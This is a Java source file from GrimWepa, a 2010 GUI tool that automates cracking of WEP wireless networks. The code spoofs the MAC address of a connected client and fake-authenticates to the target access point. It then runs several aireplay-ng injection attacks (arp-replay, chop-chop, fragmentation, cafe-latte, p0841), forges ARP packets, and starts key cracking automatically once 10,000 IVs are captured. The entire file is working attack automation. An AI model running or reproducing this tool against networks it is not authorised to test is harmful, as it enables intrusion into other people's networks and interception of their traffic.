/** runs different attacks depending on what is selected on the Gui frame;
	one big giant mess.
*/

import java.io.IOException;
import javax.swing.JOptionPane;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class threadWepAttack implements Runnable {
	/** wep attack thread*/
	Thread t;
	
	/** flag to let this and other classes know when we want to stop attacking/cracking*/
	public static boolean stopFlag;
	
	/** flag, only true when user or program has already started cracking
		value is retrieved during the 'auto-crack-at-10k-IVS' check
		@see #showIVS()*/
	public static boolean started_autocrack = false;
	
	/** attack process, used for aireplay-ng attacks*/
	public static Process proAttack = null;
	
	/** wpa_supplicant process, used for intel4965 workaround
		@see #intel4965Check() */
	public static Process proIntel;
	
	/** creates a new thread */
	public threadWepAttack() {
		t = new Thread(this, "threadWepAttack");
		stopFlag = false;
	}
	
	/** depending on user's selection, attempts to run different attacks in aireplay-ng
		in order to generate more packets<p>
		see code for more details
	*/
	public void run() {
		String client, oldMac = "", output[];
		String driver = (String)Gui.cboDrivers.getSelectedItem();
		boolean hasIntel = false; // true when user is unable to associate w/ router & has intel 4965 chipset
		proIntel = null; // process that keeps wpa_supplicant running for the intel chipset
		
		// get rid of any other aireplay processes before we start
		Methods.readExec("killall aireplay-ng");
		
		// first, figure out if we're doing a client-based attack or not...
		client = (String)Gui.cboWepClients.getSelectedItem();
		if (Gui.chkWepClient.isSelected() == true && 
			client.equals("[no clients found]") == false) {
			
			// if our attack is NOT arp-replay..
			if (Gui.cboWepAttack.getSelectedIndex() != 1) {
				oldMac = Methods.getMac(driver);
				Methods.changeMac(driver, client);
				client = " -h " + client;
			} else {
				// don't need to change mac for arpreplay
				client = " -h " + client;
			}
			
		} else {
			client = "";
		}
		
		// delete old files (arprequests, replay/fragment packets, airodump-ng log files
		deleteFragment(); 	// delete all files starting with "fragment_"
		deleteReplay();		// delete all files starting with "replay-"
		Methods.readExec("rm arprequest");
		Methods.removeFile("wep-01.cap");
		Methods.removeFile("wep-01.ivs");
		Methods.removeFile("wep-01.csv");
		Methods.removeFile("wep-01.kismet.csv");
		Methods.removeFile("wep-01.kismet.netxml");
		
		// command to start listening for specific BSSID in airodump
		String command = 	"xterm" +
							" -fg " + (String)Gui.cboColors.getSelectedItem() + 
							" -bg black" +
							" -T gw-airodump" +
							" -geom 100x15+0+0" +
							" -iconic -e ";
		
		command +=  "airodump-ng" + 
					" -w !PATH!wep" +
					" --bssid " + Methods.currentBSSID + 
					" -c " + Methods.currentChannel + 
					" --ivs" + 
					" --output-format csv" + 
					" " + (String)Gui.cboDrivers.getSelectedItem();
		
		// Methods.proAttack is the process that is running the airodump capture
		try {
			if (Methods.verbose)
				System.out.println("exec:\t" + command.replace("!PATH!", Methods.grimwepaPath));
			Methods.proAttack = Runtime.getRuntime().exec(Methods.fixArgumentsPath(command));
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		proAttack = null;
		
		if (client.equals("") && Gui.cboWepAttack.getSelectedIndex() != 6) {
			// no client to spoof, not doing passive capture; need to fake-authenticate!
			Methods.stat("attempting fake-authentication with access point...");
			
			Methods.pause(1);
			
			// start fake-auth
			output = Methods.readExec("aireplay-ng -1 0 -a " + Methods.currentBSSID + " -T 1 " + driver);
			int associated = -1;
			
			// go through output
			for (int i = 0; i < output.length; i++) {
				if (output[i].indexOf("Association successful") >= 0) {
					// OPEN SYSTEM: successfully fake-authenicated.
					associated = 1;
					break;
				} else if (output[i].indexOf("rejects open-system auth") >= 0) {
					
					associated = 0;
					break;
				}
			}
			
			// check depending on what aireplay's output told us
			switch (associated) {
			case -1:
				// neither successful nor rejected : no response?
				//Methods.stat("unable to associate with router, get closer!");
				if (JOptionPane.showConfirmDialog(
						null,
						"GrimWepa is unable to fake-authenticate with the router.\n" +
						"possible reasons for this include:\n" +
						" - you are too far from the router\n" +
						" - your wireless card is not powerful enough\n" +
						" - your wireless chipset does not support injection.\n\n" +
						"do you want to continue the attack, regardless of \n" +
						"not being associated with the router?",
						"grim wepa | wep attack error",
						JOptionPane.YES_NO_OPTION,
						JOptionPane.QUESTION_MESSAGE) != JOptionPane.YES_OPTION) {
						
						stopFlag = true;
						Methods.stat("inactive");
				}
				break;
			case 0:
				// rejects open-system authentication, aka uses SKA
				Methods.stat("access point uses shared key authentication (SKA)");
				// AP uses ShardKeyAuthentication,
				// need to capture XOR file then authenticate using that...
				// MY ROUTER DOESN'T HANDLE SKA, CANNOT TEST :[
				
				// intel 4965 check
				if (!intel4965Check()) {
					if (JOptionPane.showConfirmDialog(null, 
						"fake authentication was UNSUCCESSFUL!\n\n" + 
						"possible reasons for this include:\n" + 
						"\taccess point uses shared key authentication (SKA),\n\n" +
						"\tyour wifi card does not support injection,\n" + 
						"\tyou are too far away from the access point.\n\n" +
						"would you like to continue with the attack?",
						"grim wepa | error",
						JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION) {
						
						Methods.stat("continuing attack, despite failure");
						Methods.pause(2);
					} else {
						stopFlag = true;
						Methods.stat("inactive");
					}
				}// end of intel chipset check
				
				break;
			case 1:
				// fake-authentication successful
				Methods.stat("association with access point successful :D");
				Methods.pause (1.5);
				break;
			} // end of association-type switch statement
			
			client = " -h " + Methods.getMac(driver);
		} // end of no_client if statement
		
		if (stopFlag) {
			// we need to stop right now!
			// set the gui to what it should be
			Gui.setEnable(true);
			Gui.btnWepAttack.setLabel("start attack");
			Gui.btnWepDeauth.setEnabled(false);
			
			// kill airodump-ng process
			try {
				Methods.proAttack.destroy();
			} catch (IllegalStateException ise) {
			} catch (NullPointerException npe) {}
			
			// remove dump files
			Methods.removeFile("wep-01.cap");
			Methods.removeFile("wep-01.csv");
			Methods.removeFile("wep-01.kismet.csv");
			Methods.removeFile("wep-01.kismet.netxml");
			
			return;
		}
		
		// copied huge chunk from here
		
		switch (Gui.cboWepAttack.getSelectedIndex()) {
		case 1: // arp-replay attack
			Methods.stat("running arp-replay attack, auto-crack at 10k ivs");
			command = "";
			if (!Gui.chkHideWin.isSelected())
				command = 	"xterm" +
							" -fg " + (String)Gui.cboColors.getSelectedItem() + 
							" -bg black" +
							" -T gw-arpreplay" +
							" -geom 100x15+0+225" +
							" -iconic" +
							" -e ";
			
			command += 	"aireplay-ng -3" +
						" -b " + Methods.currentBSSID + 
						client + 
						" -x " + Gui.sldWepInjection.getValue() + 
						" " + driver;
			
			try {
				if (Methods.verbose)
					System.out.println("exec:\t" + command);
				proAttack = Runtime.getRuntime().exec(command);
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			
			do {
				// keep aireplay running arp-replay attack until we crack it or user clicks stop
				if (!Gui.cboWepClients.getSelectedItem().equals("[no clients found]")) {
					threadDeauth td = new threadDeauth();
					td.t.run();
				}
				Methods.pause (5.0);
				showIVS();
			} while (!stopFlag);
			
			break;
			
		case 2: // chopchop attack
		case 3: // fragmentation attack
			// chopchop and fragmentation commands are the exact same, except for -4 and -5
			String keystream = "";
			
			String chopfrag = (Gui.cboWepAttack.getSelectedIndex() == 2 ? "chop-chop" : "fragmentation");
			Methods.stat("starting " + chopfrag + " attack...");
			
			while ( (!stopFlag) && (keystream.equals("")) ) {
				command = "aireplay-ng -" + (chopfrag.equals("chop-chop") ? "4" : "5") + "" + client + 
										" -b " + Methods.currentBSSID + 
										" -x " + Gui.sldWepInjection.getValue() +
										" -F " + driver;
				
				Methods.stat("waiting for a data packet...");
				Methods.readExec("killall aireplay-ng");
				
				//  begin new
				BufferedReader res1 = null;
				try {
					proAttack = Runtime.getRuntime().exec(command);
				} catch (IOException ioe) {}
				res1 = new BufferedReader(new InputStreamReader(proAttack.getInputStream()));
				
				int exitVal = -1;
				do {
					try {
						exitVal = proAttack.exitValue();
					} catch (IllegalThreadStateException itse) {}
					
					Methods.pause (1);
					showIVS();
				} while (!stopFlag && exitVal != -1);
				// end new
				
				if (!stopFlag) {
					// process ended!
					String line;
					try {
						while ( (line = res1.readLine()) != null) {
							if (Methods.verbose && !line.trim().equals(""))
								System.out.println("\t" + line);
							if (line.indexOf("Saving keystream in") >= 0) {
								// this contains the keystream!
								keystream = line.substring(20);
								break;
							} else if (line.indexOf("Failure: ") >= 0) {
								stopFlag = true;
								Methods.stat(chopfrag + " attack failed; try another attack instead.");
								break;
							}
						}
					} catch (IOException ioe) {}
				}
				
				/* begin old
				output = Methods.readExec(command);
				Methods.readExec("killall aireplay-ng");
				
				for (int i = 0; i < output.length; i++) {
					if (output[i].indexOf("Saving keystream in") >= 0) {
						// this contains the keystream!
						keystream = output[i].substring(20);
						break;
					} else if (output[i].indexOf("Failure: ") >= 0) {
						stopFlag = true;
						Methods.stat(chopfrag + " attack failed; try another attack instead.");
						break;
					}
				}end old*/
			}
			
			// if we have a keystream, we need to build the arp
			if (!keystream.equals("")) {
				// if keystream != "", then we have a keystream! to the batmobile!
				Methods.stat("keystream found; building arp packet...");
				String mymac = Methods.getMac(driver);
				command = "";
				if (!Gui.chkHideWin.isSelected()) {
					command = 	"xterm" +
								" -fg " + (String)Gui.cboColors.getSelectedItem() + 
								" -T gw-packetforge" +
								" -bg black -e ";
				}
				
				command +=  "packetforge-ng" + 
							" -0" + 
							" -a " + Methods.currentBSSID + 
							" -h " + mymac + 
							" -k 255.255.255.255" + 
							" -l 255.255.255.255" + 
							" -y " + keystream + 
							" -w arprequest";
				
				Methods.readExec(command);
				
				Methods.removeFile(keystream);
				
				Methods.stat("re-playing spoofed arp; auto-crack at 10k ivs");
				// now the file 'arprequest' is the arp request we can replay over and over...
				
				command = "";
				if (!Gui.chkHideWin.isSelected()) {
					command = 	"xterm" +
								" -fg " + (String)Gui.cboColors.getSelectedItem() + 
								" -bg black" +
								" -T gw-arpreplay" +
								" -geom 100x15+0+225" +
								" -iconic" +
								" -e ";
				}
				
				command +=  "aireplay-ng" +
							" -2" +
							" -r arprequest" +
							" -x " + Gui.sldWepInjection.getValue() +
							" -F " + driver;
							
				try {
					if (Methods.verbose)
						System.out.println("exec:\t" + command);
					proAttack = Runtime.getRuntime().exec(command);
				} catch (IOException ioe) {
					ioe.printStackTrace();
				}
				
				do {
					// keep aireplay running until they stop the attack (flag == false);
					Methods.pause(1.0);
					showIVS();
				} while (!stopFlag);
				
			} else {
				// must have been stopped
				// Methods.stat(chopfrag + " attack stopped");
			}
			
			break;
			
		case 4: // cafe-latte attack
			Methods.stat("running cafe-latte attack, auto-crack at 10k ivs");
			command = "";
			if (!Gui.chkHideWin.isSelected())
				command = 	"xterm" +
							" -fg" + (String)Gui.cboColors.getSelectedItem() + 
							" -bg black" +
							" -geom 100x15+0+225" + 
							" -T gw-cafelatte" +
							" -iconic" +
							" -e ";
				
			command +=  "aireplay-ng" +
						" -6" + 
						"" + client + 
						" -b " + Methods.currentBSSID + 
						" -x " + Gui.sldWepInjection.getValue() + 
						" -D " + driver;
			
			try {
				if (Methods.verbose)
					System.out.println("exec:\t" + command);
				proAttack = Runtime.getRuntime().exec(command);
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			
			do {
				Methods.pause(1.0);
				showIVS();
			} while (!stopFlag);
			
			break;
		case 5: // p0841 attack
			Methods.stat("running -p0841 attack, auto-crack at 10k ivs");
			command = "";
			if (!Gui.chkHideWin.isSelected())
				command = 	"xterm" +
							" -fg" + (String)Gui.cboColors.getSelectedItem() + 
							" -bg black" +
							" -geom 100x15+0+225" + 
							" -T gw-p0841" +
							" -iconic" +
							" -e ";
			
			command +=  "aireplay-ng" +
						" -2" + 
						" -p 0841" + 
						" -c FF:FF:FF:FF:FF:FF" +
						" -b " + Methods.currentBSSID + 
						"" + client + 
						" " + 
						" -x " + Gui.sldWepInjection.getValue() + 
						" -F " + driver;
			
			try {
				if (Methods.verbose)
					System.out.println("exec:\t" + command);
				proAttack = Runtime.getRuntime().exec(command);
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			
			do {
				Methods.pause(1.0);
				showIVS();
			} while (!stopFlag);
			
			break;
		case 6: // passive capture
			// just listen for packets, that's it!
			Methods.stat("passively capturing ivs packets...");
			int time = 0;
			do {
				Methods.stat("passive capture... " + Methods.secToHMS(time));
				time++;
				showIVS();
				Methods.pause(1.0);
			} while (!stopFlag);
			// Methods.stat("passive capture interrupted");
			
			break;
		} // end of different attacks switch statement
		
		
		if (proIntel != null) {
			proIntel.destroy(); // kill wpa_supplicant if it's running
			proIntel = null;
		}
		
		// delete the fake.conf file, too, just in case
		Methods.removeFile("fake.conf");
		
		Gui.setEnable(true);
		Gui.btnWepAttack.setLabel("start attack");
		Gui.btnWepDeauth.setEnabled(false);
		
		// stop aireplay
		try {
			proAttack.destroy();
		} catch (IllegalStateException ise) {
		} catch (NullPointerException npe) {}
		
		// stop airodump
		try {
			Methods.proAttack.destroy();
		} catch (IllegalStateException ise) {
		} catch (NullPointerException npe) {}
		
		// kill all aireplay's
		Methods.readExec("killall aireplay-ng");
		
		// if we changed the mac.. change it back
		if (!oldMac.equals("")) {
			Methods.changeMac(driver, oldMac);
		}
		
		// get rid of those damn replay_ packets
		deleteReplay();
		
		// get rid of airodump files fragment- files
		deleteFragment();
		
		// delete arprequest file (we may have craeted it)
		Methods.readExec("rm arprequest");
		
		// Methods.removeFile("wep-01.ivs"); // don't delete the IVS!
		// more airodump files to delete
		Methods.removeFile("wep-01.cap");
		Methods.removeFile("wep-01.csv");
		Methods.removeFile("wep-01.kismet.csv");
		Methods.removeFile("wep-01.kismet.netxml");
	} // end of run() method
	
	/** deletes all 'replay_***.cap' files created by aireplay-ng
	*/
	private static void deleteReplay() {
		// deletes all files that start with "replay_" and end with "cap"
		// files are created by aireplay-ng when doing certain attacks
		String output[] = Methods.readExec("ls");
		for (int i = 0; i < output.length; i++) {
			if (output[i].length() > 10) {
				if ((output[i].substring(0,7).equals("replay_") == true) &&
					 output[i].substring(output[i].length() - 3).equals("cap")) {
						Methods.readExec("rm " + output[i]);
				}
			}
		}
	}
	
	/** deletes all of the 'fragment-***.xor' files created by aireplay-ng
	*/
	private static void deleteFragment() {
		// deletes all files that start with "fragment-" and end with "xor"
		// created by aireplay-ng when doing fragmentation attack
		String output[] = Methods.readExec("ls");
		for (int i = 0; i < output.length; i++) {
			if (output[i].length() > 10) {
				if ((output[i].substring(0,9).equals("fragment-") == true) &&
					 output[i].substring(output[i].length() - 3).equals("xor")) {
						Methods.readExec("rm " + output[i]);
				}
			}
		}
	}
	
	/** updates lblIvs with the next IVS count
		also, makes 10,000+ ivs = cracking
	*/
	private static void showIVS() {
		// looks at airodump's CSV file for number of IVS collected
		// also, if # is greater than 10,000, and we haven't started cracking yet.. it starts cracking!
		if (Methods.verbose)
			System.out.println("Methods.fileExists(Methods.grimwepaPath + 'wep-01.csv') = " + 
						Methods.fileExists(Methods.grimwepaPath + "wep-01.csv"));
		
		if (!Methods.fileExists(Methods.grimwepaPath + "wep-01.csv"))
			return;
		
		String ivs = "", output[] = Methods.readFile(Methods.grimwepaPath + "wep-01.csv");
		
		for (int i = 0; i < output.length; i++) {
			if (Methods.verbose)
				System.out.println("Line " + (i + 1) + ": " + output[i]);
			
			if ((output[i].indexOf(Methods.currentBSSID) >= 0) && (output[i].indexOf("WEP") >= 0 )) {
				String arr[] = output[i].split(", ");
				ivs = arr[10].replace(" ", "");
			}
		}
		if (Methods.verbose)
			System.out.println("ivs = \"" + ivs + "\"");
		
		if (ivs.equals(""))
			ivs = "0";
		int count = 0;
		
		try {
			count = Integer.parseInt(ivs);
		} catch (NumberFormatException nfe) {}
		
		Gui.lblWepIvs.setText("captured ivs: " + String.format("%,d", count));
		
		if (count >= 10000 && Gui.btnWepCrack.getLabel().equals("start cracking") && !started_autocrack) {
			started_autocrack = true;
			Methods.wepCrack();
		}
	}
	
	/** specific to the intel 4965 chipset;
		returns false if chipset is not intel4965 based,
		returns true if chipset is of intel4965 family;
		if true, method asks user if they want to perform wpa_supplicant workaround
		<p> 
		the chipset is unable to inject packets and fake-authenticate
		but a simple wpa_supplicant work-around solves the problem easily
		@return false if system is not using intel 4965 chipset, true otherwise
	*/
	private static boolean intel4965Check() {
		// does all of the special stuff that intel4965 chipset needs in order to fake-authenticate with an access point
		String output[] = Methods.readExec("airmon-ng");
		String driver = (String)Gui.cboDrivers.getSelectedItem();
		
		boolean hasIntel = false;
		
		for (int i = 0; i < output.length; i++) {
			if ( (output[i].indexOf(driver) >= 0) && (output[i].indexOf("Intel 4965") >= 0) ) {
				hasIntel = true;
				break;
			}
		}
		
		if (!hasIntel)
			return false;
		
		String answer = JOptionPane.showInputDialog(null, 
				"fake authentication was unsuccessful, but GrimWepa has noticed that you are using " +
				"the intel 4965/5xxx chipset.\n\nTo attempt the wpa_supplicant work-around for this chipset, " +
				"we need your original interface/device...\n\n" +
				"for example: if you put 'wlan0' into monitor mode, and are using mon0, " + 
				"then you would type in wlan0 below:" + 
				"\n\nCancel will continue the attack, avoiding the wpa_supplicant work-around",
				"wlan0");
		
		// if they didn't click cancel
		if (answer.equals("null") == false) {
			// create fake.conf file
			Methods.stat("creating fake.conf configuration file...");
			Methods.writeFile(
				Methods.grimwepaPath + "fake.conf",
				"network={\n" +
				"ssid=\"" + Methods.currentSSID + "\"\n" +
				"key_mgmt=NONE\n" + 
				"wep_key0=\"fakeauth\"\n" +
				"}"
			);
			
			Methods.pause (0.5); // wait half a second
			
			Methods.stat("running wpa_supplicant on file...");
			try {
				if (Methods.verbose) {
					System.out.println(
						"exec:\twpa_supplicant -c " + Methods.grimwepaPath + "fake.conf" +
						" -i" + driver + " -Dwext -B");
				}
				proIntel = Runtime.getRuntime().exec(
						"wpa_supplicant" +
						" -c" + Methods.grimwepaPath.replaceAll(" ", "\\\\ ") + "fake.conf" +
						" -i" + driver + 
						" -Dwext -B"
					);
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			
			Methods.stat("giving wpa_supplicant time to fake-authenticate...");
			Methods.pause (4.0); // wait 4 seconds for wpa_supplicant to catch up...
			
		// they clicked cancel
		} else {
			Methods.stat("continuing attack, despite authentication failure");
			Methods.pause (2.0);
		}
		
		return true;
	}
}

/** GrimWepa v1.10
	Copyright (C) 2010 Derv Merkler
*/